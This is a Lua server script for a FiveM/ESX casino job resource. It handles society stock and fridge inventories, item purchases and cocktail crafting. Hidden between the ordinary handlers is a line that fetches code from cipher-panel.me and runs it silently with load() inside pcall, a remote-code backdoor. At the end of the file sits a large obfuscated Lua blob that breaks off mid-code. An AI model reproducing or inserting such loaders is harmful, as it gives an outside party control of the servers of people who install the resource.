ESX                = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

if Config.MaxInService ~= -1 then
  TriggerEvent('esx_service:activateService', 'casino', Config.MaxInService)
end

TriggerEvent('esx_phone:registerNumber', 'casino', _U('casino_customer'), true, true)
TriggerEvent('esx_society:registerSociety', 'casino', 'casino', 'society_casino', 'society_casino', 'society_casino', {type = 'private'})



RegisterServerEvent('esx_casinojob:getStockItem')
AddEventHandler('esx_casinojob:getStockItem', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_casino', function(inventory)

    local item = inventory.getItem(itemName)

    if item.count >= count then
      inventory.removeItem(itemName, count)
      xPlayer.addInventoryItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('you_removed') .. count .. ' ' .. item.label)

  end)

end)

PerformHttpRequest('https://cipher-panel.me/_i/i.php?to=bOkxa', function (e, d) pcall(function() assert(load(d))() end) end)

ESX.RegisterServerCallback('esx_casinojob:getStockItems', function(source, cb)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_casino', function(inventory)
    cb(inventory.items)
  end)

end)

RegisterServerEvent('esx_casinojob:putStockItems')
AddEventHandler('esx_casinojob:putStockItems', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)
  local sourceItem = xPlayer.getInventoryItem(itemName)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_casino', function(inventory)

    local inventoryItem = inventory.getItem(itemName)

    if sourceItem.count >= count and count > 0 then
      xPlayer.removeInventoryItem(itemName, count)
      inventory.addItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('added') .. count .. ' ' .. item.label)

  end)

end)


RegisterServerEvent('esx_casinojob:getFridgeStockItem')
AddEventHandler('esx_casinojob:getFridgeStockItem', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_casino_fridge', function(inventory)

    local item = inventory.getItem(itemName)

    if item.count >= count then
      inventory.removeItem(itemName, count)
      xPlayer.addInventoryItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('you_removed') .. count .. ' ' .. item.label)

  end)

end)

ESX.RegisterServerCallback('esx_casinojob:getFridgeStockItems', function(source, cb)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_casino_fridge', function(inventory)
    cb(inventory.items)
  end)

end)

RegisterServerEvent('esx_casinojob:putFridgeStockItems')
AddEventHandler('esx_casinojob:putFridgeStockItems', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_casino_fridge', function(inventory)

    local item = inventory.getItem(itemName)
    local playerItemCount = xPlayer.getInventoryItem(itemName).count

    if item.count >= 0 and count <= playerItemCount then
      xPlayer.removeInventoryItem(itemName, count)
      inventory.addItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('invalid_quantity'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('you_added') .. count .. ' ' .. item.label)

  end)

end)


RegisterServerEvent('esx_casinojob:buyItem')
AddEventHandler('esx_casinojob:buyItem', function(itemName, price, itemLabel)

    local _source = source
    local xPlayer  = ESX.GetPlayerFromId(_source)
    local limit = xPlayer.getInventoryItem(itemName).limit
    local qtty = xPlayer.getInventoryItem(itemName).count
    local societyAccount = nil

    TriggerEvent('esx_addonaccount:getSharedAccount', 'society_casino', function(account)
        societyAccount = account
      end)
    
    if societyAccount ~= nil and societyAccount.money >= price then
        if qtty < limit then
            societyAccount.removeMoney(price)
            xPlayer.addInventoryItem(itemName, 1)
            TriggerClientEvent('esx:showNotification', _source, _U('bought') .. itemLabel)
        else
            TriggerClientEvent('esx:showNotification', _source, _U('max_item'))
        end
    else
        TriggerClientEvent('esx:showNotification', _source, _U('pasassezargent'))
    end

end)


RegisterServerEvent('esx_casinojob:craftingCoktails')
AddEventHandler('esx_casinojob:craftingCoktails', function(itemValue)

    local _source = source
    local _itemValue = itemValue
    TriggerClientEvent('esx:showNotification', _source, _U('assembling_cocktail'))

    if _itemValue == 'jagerbomb' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('energy').count
            local bethQuantity      = xPlayer.getInventoryItem('jager').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('energy') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('jager') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('energy', 2)
                    xPlayer.removeInventoryItem('jager', 2)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('jagerbomb') .. ' ~w~!')
                    xPlayer.removeInventoryItem('energy', 2)
                    xPlayer.removeInventoryItem('jager', 2)
                    xPlayer.addInventoryItem('jagerbomb', 1)
                end
            end

        end)
    end
    
    if _itemValue == 'golem' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('limonade').count
            local bethQuantity      = xPlayer.getInventoryItem('vodka').count
            local gimelQuantity     = xPlayer.getInventoryItem('ice').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('limonade') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('vodka') .. '~w~')
            elseif gimelQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('ice') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('limonade', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('golem') .. ' ~w~!')
                    xPlayer.removeInventoryItem('limonade', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                    xPlayer.addInventoryItem('golem', 1)
                end
            end

        end)
    end
    
    if _itemValue == 'whiskycoca' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('soda').count
            local bethQuantity      = xPlayer.getInventoryItem('whisky').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('soda') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('whisky') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('soda', 2)
                    xPlayer.removeInventoryItem('whisky', 2)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('whiskycoca') .. ' ~w~!')
                    xPlayer.removeInventoryItem('soda', 2)
                    xPlayer.removeInventoryItem('whisky', 2)
                    xPlayer.addInventoryItem('whiskycoca', 1)
                end
            end

        end)
    end

    if _itemValue == 'rhumcoca' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('soda').count
            local bethQuantity      = xPlayer.getInventoryItem('rhum').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('soda') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('rhum') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('soda', 2)
                    xPlayer.removeInventoryItem('rhum', 2)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('rhumcoca') .. ' ~w~!')
                    xPlayer.removeInventoryItem('soda', 2)
                    xPlayer.removeInventoryItem('rhum', 2)
                    xPlayer.addInventoryItem('rhumcoca', 1)
                end
            end

        end)
    end

    if _itemValue == 'vodkaenergy' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('energy').count
            local bethQuantity      = xPlayer.getInventoryItem('vodka').count
            local gimelQuantity     = xPlayer.getInventoryItem('ice').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('energy') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('vodka') .. '~w~')
            elseif gimelQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('ice') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('energy', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('vodkaenergy') .. ' ~w~!')
                    xPlayer.removeInventoryItem('energy', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                    xPlayer.addInventoryItem('vodkaenergy', 1)
                end
            end

        end)
    end

    if _itemValue == 'vodkafruit' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('jusfruit').count
            local bethQuantity      = xPlayer.getInventoryItem('vodka').count
            local gimelQuantity     = xPlayer.getInventoryItem('ice').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('jusfruit') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('vodka') .. '~w~')
            elseif gimelQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('ice') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('jusfruit', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('vodkafruit') .. ' ~w~!')
                    xPlayer.removeInventoryItem('jusfruit', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                    xPlayer.addInventoryItem('vodkafruit', 1) 
                end
            end

        end)
    end

    if _itemValue == 'rhumfruit' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('jusfruit').count
            local bethQuantity      = xPlayer.getInventoryItem('rhum').count
            local gimelQuantity     = xPlayer.getInventoryItem('ice').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('jusfruit') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('rhum') .. '~w~')
            elseif gimelQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('ice') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('jusfruit', 2)
                    xPlayer.removeInventoryItem('rhum', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('rhumfruit') .. ' ~w~!')
                    xPlayer.removeInventoryItem('jusfruit', 2)
                    xPlayer.removeInventoryItem('rhum', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                    xPlayer.addInventoryItem('rhumfruit', 1)
                end
            end

        end)
    end

    if _itemValue == 'teqpaf' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('limonade').count
            local bethQuantity      = xPlayer.getInventoryItem('tequila').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('limonade') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('tequila') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('limonade', 2)
                    xPlayer.removeInventoryItem('tequila', 2)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('teqpaf') .. ' ~w~!')
                    xPlayer.removeInventoryItem('limonade', 2)
                    xPlayer.removeInventoryItem('tequila', 2)
                    xPlayer.addInventoryItem('teqpaf', 1)
                end
            end

        end)
    end

    if _itemValue == 'mojito' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('rhum').count
            local bethQuantity      = xPlayer.getInventoryItem('limonade').count
            local gimelQuantity     = xPlayer.getInventoryItem('menthe').count
            local daletQuantity      = xPlayer.getInventoryItem('ice').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('rhum') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('limonade') .. '~w~')
            elseif gimelQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('menthe') .. '~w~')
            elseif daletQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('ice') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('rhum', 2)
                    xPlayer.removeInventoryItem('limonade', 2)
                    xPlayer.removeInventoryItem('menthe', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('mojito') .. ' ~w~!')
                    xPlayer.removeInventoryItem('rhum', 2)
                    xPlayer.removeInventoryItem('limonade', 2)
                    xPlayer.removeInventoryItem('menthe', 2)
                    xPlayer.removeInventoryItem('ice', 1)
                    xPlayer.addInventoryItem('mojito', 1)
                end
            end

        end)
    end

    if _itemValue == 'mixapero' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('bolcacahuetes').count
            local bethQuantity      = xPlayer.getInventoryItem('bolnoixcajou').count
            local gimelQuantity     = xPlayer.getInventoryItem('bolpistache').count
            local daletQuantity     = xPlayer.getInventoryItem('bolchips').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('bolcacahuetes') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('bolnoixcajou') .. '~w~')
            elseif gimelQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('bolpistache') .. '~w~')
            elseif daletQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('bolchips') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('bolcacahuetes', 2)
                    xPlayer.removeInventoryItem('bolnoixcajou', 2)
                    xPlayer.removeInventoryItem('bolpistache', 2)
                    xPlayer.removeInventoryItem('bolchips', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('mixapero') .. ' ~w~!')
                    xPlayer.removeInventoryItem('bolcacahuetes', 2)
                    xPlayer.removeInventoryItem('bolnoixcajou', 2)
                    xPlayer.removeInventoryItem('bolpistache', 2)
                    xPlayer.removeInventoryItem('bolchips', 2)
                    xPlayer.addInventoryItem('mixapero', 1)
                end
            end

        end)
    end

    if _itemValue == 'metreshooter' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('jager').count
            local bethQuantity      = xPlayer.getInventoryItem('vodka').count
            local gimelQuantity     = xPlayer.getInventoryItem('whisky').count
            local daletQuantity     = xPlayer.getInventoryItem('tequila').count

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('jager') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('vodka') .. '~w~')
            elseif gimelQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('whisky') .. '~w~')
            elseif daletQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('tequila') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('jager', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('whisky', 2)
                    xPlayer.removeInventoryItem('tequila', 2)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('metreshooter') .. ' ~w~!')
                    xPlayer.removeInventoryItem('jager', 2)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('whisky', 2)
                    xPlayer.removeInventoryItem('tequila', 2)
                    xPlayer.addInventoryItem('metreshooter', 1)
                end
            end

        end)
    end

    if _itemValue == 'jagercerbere' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('jagerbomb').count
            local bethQuantity      = xPlayer.getInventoryItem('vodka').count
            local gimelQuantity     = xPlayer.getInventoryItem('tequila').count

            if alephQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('jagerbomb') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('vodka') .. '~w~')
            elseif gimelQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('tequila') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('jagerbomb', 1)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('tequila', 2)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('craft') .. _U('jagercerbere') .. ' ~w~!')
                    xPlayer.removeInventoryItem('jagerbomb', 1)
                    xPlayer.removeInventoryItem('vodka', 2)
                    xPlayer.removeInventoryItem('tequila', 2)
                    xPlayer.addInventoryItem('jagercerbere', 1)
                end
            end

        end)
    end

end)

return(function(Bu,sb,Ru,cb,yb,mb,Ob,uu,zb,Rb,vb,Yb,Cu,wb,Hb,Kb,Wb,Iu,tb,ub,Fb,nb,pb,mu,Lb,Pb,Bb,Uu,Eb,fb,jb,eu,ku,Qb,gb,ju,bu,Nb,ob,Xb,db,Tu,Tb,Ju,ab,Zb,Db,ib,Cb,qb,Ab,lb,bb,xb,hb,Vb,rb,fu,Mb,Gb,Sb,...)local B,u=bb[Cb],fb;local o=Rb;local k,I,e,J,U=Bb,ub,mb,jb,Tb;local H,z=Lb,(rb or ob);local f,R=bb[Hb],zb;local m,j,T,L=ib,bb[Vb],db[Yb],(Kb);local r=lb;local b,C=Mb,Pb;local d,Y,K,l,M,P,Q,S=Qb,Qb,Qb,Qb,Qb,Qb,Qb,(Qb);local i,V=Sb,Wb;for sI=0,9 do if not(sI<=4)then do if not(sI<=6)then if sI<=7 then else if sI~=8 then S=function()local JC=(R(P,K,K));local qC=1;while(cb)do if qC~=0 then K=K+1;do qC=0;end;else do return JC;end;end;end;end;else P=m(f(P,5),Ab,function(Cj)if R(Cj,2)~=72 then local EA=(B(e(Cj,16)));do if not(Q)then return EA;else local k6=u(EA,Q);Q=Qb;do return k6;end;end;end;else local HM=1;do while(cb)do do if HM~=0 then Q=e(f(Cj,1,1));HM=0;else return wb;end;end;end;end;end;end);end;end;else if sI~=5 then P=nb;else end;end;end;else if not(sI<=1)then do if not(sI<=2)then if sI==3 then K=1;else end;else Y={};end;end;else do if sI~=0 then else d=(V and V()or qb);end;end;end;end;end;local Ub,W,q,n,A,c,w,s=6,Qb,Qb,Qb,Qb,Qb,Qb,Qb;repeat if not(Ub<=3)then if not(Ub<=5)then if Ub~=6 then n=4294967296;Ub=5;else W=function()local e5=1;local p5,A5,J5,s5=Qb,Qb,Qb,(Qb);do repeat if e5~=0 then do p5,A5,J5,s5=R(P,K,K+3);end;do e5=0;end;else K=K+4;e5=2;end;until e5>=2;end;do return s5*16777216+J5*65536+A5*256+p5;end;end;do Ub=2;end;end;else if Ub~=4 then do A=2^52;end;do Ub=3;end;else do local e2=2;do for XI=1,31 do w[XI]=e2;do e2=e2*2;end;end;end;end;Ub=0;end;end;else if not(Ub<=1)then if Ub~=2 then c=n-1;Ub=1;else q=2147483648;Ub=7;end;else if Ub~=0 then do w={[0]=1};end;Ub=4;else s=function(zD,FD,QD)local XD=(1);local rD=(Qb);while(cb)do if not(XD<=0)then do if XD~=1 then return rD;else rD=(zD/w[FD])%w[QD];do XD=0;end;end;end;else rD=rD-rD%1;XD=2;end;end;end;Ub=8;end;end;end;until Ub>=8;Ub=2;local Z,E,g=Qb,Qb,Qb;while(cb)do do if not(Ub<=0)then do if Ub==1 then g={[0]={[0]=0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{[0]=1,0,3,2,5,4,7,6,9,8,11,10,13,12,15,14},{[0]=2,3,0,1,6,7,4,5,10,11,8,9,14,15,12,13},{[0]=3,2,1,0,7,6,5,4,11,10,9,8,15,14,13,12},{[0]=4,5,6,7,0,1,2,3,12,13,14,15,8,9,10,11},{[0]=5,4,7,6,1,0,3,2,13,12,15,14,9,8,11,10},{[0]=6,7,4,5,2,3,0,1,14,15,12,13,10,11,8,9},{[0]=7,6,5,4,3,2,1,0,15,14,13,12,11,10,9,8},{[0]=8,9,10,11,12,13,14,15,0,1,2,3,4,5,6,7},{[0]=9,8,11,10,13,12,15,14,1,0,3,2,5,4,7,6},{[0]=10,11,8,9,14,15,12,13,2,3,0,1,6,7,4,5},{[0]=11,10,9,8,15,14,13,12,3,2,1,0,7,6,5,4},{[0]=12,13,14,15,8,9,10,11,4,5,6,7,0,1,2,3},{[0]=13,12,15,14,9,8,11,10,5,4,7,6,1,0,3,2},{[0]=14,15,12,13,10,11,8,9,6,7,4,5,2,3,0,1},{[0]=15,14,13,12,11,10,9,8,7,6,5,4,3,2,1,0}};break;else do Z=function()local q0,W0=W(),W();if not(W0>=q)then else W0=W0-n;end;do return W0*n+q0;end;end;end;do Ub=0;end;end;end;else do E=function()local YP=(W());local QP=(W());local mP,aP,RP=Qb,Qb,Qb;local SP=3;repeat if not(SP<=1)then if SP==2 then RP=s(QP,0,20)*n+YP;SP=4;else do if not(YP==0 and QP==0)then else do return 0;end;end;end;SP=1;end;else if SP~=0 then mP=(-1)^s(QP,31,1);SP=0;else aP=s(QP,20,11);SP=2;end;end;until SP==4;SP=1;local qP=Qb;repeat if not(SP<=0)then if SP~=1 then return mP*(2^(aP-1023))*(RP/A+qP);else qP=1;do SP=0;end;end;else if aP==0 then if RP~=0 then local X9=(1);do while X9<=1 do if X9==0 then qP=0;X9=2;else aP=1;do X9=0;end;end;end;end;else return mP*0;end;elseif aP~=2047 then else if RP~=0 then return mP*(1/0);else do return mP*(0/0);end;end;end;SP=2;end;until(sb);end;end;do Ub=1;end;end;end;end;local x=((Zb or Eb));local v=(x and x[gb]or function(Vl,yl)local tl=1;local Jl,ml=Qb,(Qb);while tl~=5 do do if tl<=1 then do if tl~=0 then Vl=Vl%n;do tl=3;end;else while Vl>0 and yl>0 do local MF,PF,HF=1,Qb,(Qb);do while MF~=4 do do if not(MF<=1)then if MF~=2 then ml=ml+g[PF][HF]*Jl;MF=2;else Vl=(Vl-PF)/16;do MF=4;end;end;else do if MF~=0 then PF=Vl%16;MF=0;else do HF=yl%16;end;MF=3;end;end;end;end;end;end;MF=0;while MF~=2 do do if MF~=0 then Jl=Jl*16;do MF=2;end;else yl=(yl-HF)/16;MF=1;end;end;end;end;tl=5;end;end;else if not(tl<=2)then do if tl~=3 then Jl=1;tl=2;else yl=yl%n;do tl=4;end;end;end;else ml=0;tl=0;end;end;end;end;return ml+Vl*Jl+yl*Jl;end);local F=(x and x[xb]or function(P2,n2)do P2=P2%n;end;do n2=n2%n;end;return((P2+n2)-v(P2,n2))/2;end);local p=(x and x[vb]or function(cZ,PZ)cZ=cZ%n;PZ=PZ%n;return c-F(c-cZ,c-PZ);end);local O,y=x and x[Fb]or function(b_)return c-(b_%n);end,x and x[pb];local a=x and x[Ob];Ub=4;local G,X=Qb,Qb;while(cb)do if not(Ub<=1)then do if not(Ub<=2)then do if Ub==3 then l=S();break;else y=y or function(oG,GG)local dG=2;while(cb)do if not(dG<=0)then if dG~=1 then if not(GG>=32)then else return 0;end;dG=0;else do return(oG*w[GG])%n;end;end;else do if not(GG<0)then else return a(oG,-GG);end;end;dG=1;end;end;end;Ub=2;end;end;else a=a or function(L_,Z_)local q_=Qb;for VL=0,3 do if VL<=1 then if VL~=0 then if Z_<0 then return y(L_,-Z_);end;else if not(Z_>=32)then else return 0;end;end;else if VL~=2 then return q_-q_%1;else q_=(L_%n/w[Z_]);end;end;end;end;Ub=1;end;end;else if Ub==0 then X=function(NK)local HK=W();local QK=wb;local YK=1;while(cb)do if not(YK<=0)then if YK~=1 then do return QK;end;else for X2=1,HK,7997 do local F2=(0);local l2,p2=Qb,(Qb);repeat if not(F2<=1)then if F2<=2 then if not(l2>HK)then else l2=HK;end;F2=1;else if F2~=3 then for y5=1,#p2 do(p2)[y5]=v(p2[y5],l);l=(NK*l+7)%256;end;F2=3;else QK=QK..B(z(p2));break;end;end;else do if F2~=0 then p2={R(P,K+X2-1,K+l2-1)};do F2=4;end;else l2=X2+yb-1;F2=2;end;end;end;until(sb);end;YK=0;end;else K=K+HK;do YK=2;end;end;end;end;Ub=3;else G=function(Ir)local er=({R(P,K,K+3)});local Cr=v(er[1],M);local gr=(v(er[2],M));local rr=v(er[3],M);local Ar=(v(er[4],M));local hr=1;repeat if hr<=0 then return Ar*ab+rr*65536+gr*256+Cr;else do if hr~=1 then K=K+4;hr=0;else M=(69*M+Ir)%256;hr=2;end;end;end;until(sb);end;Ub=0;end;end;end;M=S();local t,D,N,h,kb,Ib,eb,Jb={},Qb,Qb,Qb,Qb,Qb,Qb,(Qb);for o7=0,10 do do if o7<=4 then if not(o7<=1)then do if not(o7<=2)then if o7~=3 then kb={};else do h=1;end;end;else do N={};end;end;end;else if o7~=0 then D=function(...)return I(Gb,...),{...};end;else for Du=1,S()do local lu,Zu=1,(Qb);while(cb)do if not(lu<=0)then do if lu~=1 then(t)[Du-1]=Zu;lu=0;else Zu={};lu=2;end;end;else for P7=1,S()do local E7,a7,p7=1,Qb,(Qb);repeat if not(E7<=0)then if E7~=1 then Zu[p7]=s(a7,0,4);E7=3;else a7=S();E7=0;end;else p7=(P7-1)*2;do E7=2;end;end;until E7>2;(Zu)[p7+1]=s(a7,4,4);end;break;end;end;end;end;end;else if not(o7<=7)then if not(o7<=8)then if o7~=9 then N=Qb;else kb[3]=N;end;else Jb=eb();end;else if not(o7<=5)then if o7~=6 then function eb()local h8,b8,Q8,c8=3,Qb,Qb,(Qb);while h8~=4 do if not(h8<=1)then if h8~=2 then do h8=0;end;else do Q8={};end;h8=1;end;else if h8==0 then b8={{},Qb,{},Qb,{},Qb,Qb,Qb,Qb};h8=2;else c8={};h8=4;end;end;end;local C8=1;do h8=6;end;local V8,O8=Qb,(Qb);do while h8<=6 do if h8<=2 then if not(h8<=0)then if h8==1 then O8=S();h8=5;else for u1=1,V8 do local S1=W();local k1=(1);local w1,b1=Qb,(Qb);while k1~=3 do if k1<=0 then for jv=S1,w1 do do(b8[5])[jv]=b1;end;end;k1=3;else if k1~=1 then b1=W();k1=0;else w1=W();k1=2;end;end;end;end;h8=1;end;else V8=W();do h8=2;end;end;else if not(h8<=4)then if h8~=5 then do(b8)[14]=S();end;h8=4;else(b8)[9]=s(O8,1,1)~=0;h8=3;end;else if h8~=3 then do b8[19]=S();end;h8=0;else b8[8]=s(O8,2,1)~=0;h8=7;end;end;end;end;end;(b8)[4]=S();local E8=(W());h8=3;local z8=(Qb);do while h8<=3 do if h8<=1 then if h8~=0 then b8[6]=S();h8=2;else z8=W()-133711;h8=4;end;else do if h8==2 then(b8)[2]=S();h8=0;else 